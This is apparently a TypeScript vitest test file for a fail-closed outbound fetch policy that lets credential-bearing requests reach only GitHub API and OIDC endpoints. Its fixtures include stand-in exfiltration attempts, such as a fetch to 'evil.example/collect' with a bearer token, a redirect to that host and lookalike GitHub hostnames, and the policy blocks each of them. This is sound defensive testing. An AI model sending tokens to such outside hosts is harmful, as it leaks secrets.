import { afterEach, describe, expect, it, vi } from "vitest";
import {
  createFailClosedFetch,
  ensureGlobalOutboundFetchPolicy,
  isTrustedCredentialEgress,
  resetGlobalOutboundFetchPolicy,
  type FetchHost,
  type FetchLike,
} from "../src/outbound-fetch-policy";

describe("credential-bearing outbound fetch policy", () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("allows only GitHub API and pinned GitHub OIDC endpoints", () => {
    expect(isTrustedCredentialEgress("https://api.github.com/app/installations")).toBe(true);
    expect(isTrustedCredentialEgress(new URL("https://api.github.com/repos/cwl/noema?per_page=100"))).toBe(true);
    expect(isTrustedCredentialEgress(new Request(
      "https://token.actions.githubusercontent.com/.well-known/openid-configuration",
    ))).toBe(true);
    expect(isTrustedCredentialEgress(
      "https://token.actions.githubusercontent.com/.well-known/jwks",
    )).toBe(true);
  });

  it.each([
    "not a URL",
    "http://api.github.com/app/installations",
    "https://user:secret@api.github.com/app/installations",
    "https://api.github.com.evil.example/app/installations",
    "https://api.github.com:444/app/installations",
    "https://api.github.com/app/installations#fragment",
    "https://token.actions.githubusercontent.com/.well-known/openid-configuration?tenant=other",
    "https://token.actions.githubusercontent.com/.well-known/jwks/extra",
    "https://example.com/.well-known/jwks",
  ])("rejects an outbound destination outside the reviewed allowlist: %s", (value) => {
    expect(isTrustedCredentialEgress(value)).toBe(false);
  });

  it("forces manual redirects while preserving the requested operation", async () => {
    const rawFetch = vi.fn<FetchLike>(async () => new Response("ok"));
    const wrapped = createFailClosedFetch(rawFetch);
    const request = new Request("https://api.github.com/app/installations", {
      method: "GET",
      headers: { authorization: "Bearer sensitive" },
    });

    const response = await wrapped(request, { redirect: "follow" });

    expect(response.status).toBe(200);
    expect(rawFetch).toHaveBeenCalledWith(request, { redirect: "manual" });
  });

  it("blocks an untrusted destination before the network call", async () => {
    const rawFetch = vi.fn<FetchLike>();
    const wrapped = createFailClosedFetch(rawFetch);

    const response = await wrapped("https://evil.example/collect", {
      headers: { authorization: "Bearer sensitive" },
    });

    expect(rawFetch).not.toHaveBeenCalled();
    expect(response.status).toBe(502);
    expect(response.headers.get("x-noema-egress-policy")).toBe("blocked-destination");
    expect(response.headers.get("location")).toBeNull();
  });

  it("converts a 3xx response into a bodyless fail-closed gateway response", async () => {
    const rawFetch = vi.fn<FetchLike>(async () => new Response(null, {
      status: 302,
      headers: { location: "https://evil.example/collect" },
    }));
    const wrapped = createFailClosedFetch(rawFetch);

    const response = await wrapped("https://api.github.com/app/installations");

    expect(response.status).toBe(502);
    expect(response.headers.get("x-noema-egress-policy")).toBe("blocked-redirect");
    expect(response.headers.get("location")).toBeNull();
    expect(await response.text()).toBe("");
  });

  it("also rejects a response already marked as redirected", async () => {
    const redirectedResponse = {
      redirected: true,
      status: 200,
    } as Response;
    const rawFetch = vi.fn<FetchLike>(async () => redirectedResponse);
    const wrapped = createFailClosedFetch(rawFetch);

    const response = await wrapped("https://api.github.com/app/installations");

    expect(response.status).toBe(502);
    expect(response.headers.get("x-noema-egress-policy")).toBe("blocked-redirect");
  });

  it("installs once, detects tampering, and restores an untouched host", async () => {
    const nativeFetch = vi.fn<FetchLike>(async () => new Response("ok"));
    const host: FetchHost = { fetch: nativeFetch };

    expect(ensureGlobalOutboundFetchPolicy(host)).toBe(true);
    const wrapped = host.fetch;
    expect(wrapped).not.toBe(nativeFetch);
    expect(ensureGlobalOutboundFetchPolicy(host)).toBe(true);

    const response = await host.fetch!("https://api.github.com/meta");
    expect(response.status).toBe(200);
    expect(nativeFetch).toHaveBeenCalledWith(
      "https://api.github.com/meta",
      { redirect: "manual" },
    );

    const tampered = vi.fn<FetchLike>();
    host.fetch = tampered;
    expect(ensureGlobalOutboundFetchPolicy(host)).toBe(false);
    resetGlobalOutboundFetchPolicy(host);
    expect(host.fetch).toBe(tampered);
  });

  it("restores the original fetch when the installed wrapper is intact", () => {
    const nativeFetch = vi.fn<FetchLike>();
    const host: FetchHost = { fetch: nativeFetch };

    expect(ensureGlobalOutboundFetchPolicy(host)).toBe(true);
    resetGlobalOutboundFetchPolicy(host);

    expect(host.fetch).toBe(nativeFetch);
    resetGlobalOutboundFetchPolicy(host);
  });

  it("fails closed when fetch is missing, immutable, or silently replaced", () => {
    expect(ensureGlobalOutboundFetchPolicy({})).toBe(false);

    const nativeFetch = vi.fn<FetchLike>();
    const immutableHost = Object.freeze<FetchHost>({ fetch: nativeFetch });
    expect(ensureGlobalOutboundFetchPolicy(immutableHost)).toBe(false);

    let current: FetchLike | undefined = nativeFetch;
    const silentHost = {} as FetchHost;
    Object.defineProperty(silentHost, "fetch", {
      configurable: true,
      get: () => current,
      set: () => {
        current = nativeFetch;
      },
    });
    expect(ensureGlobalOutboundFetchPolicy(silentHost)).toBe(false);
  });
});
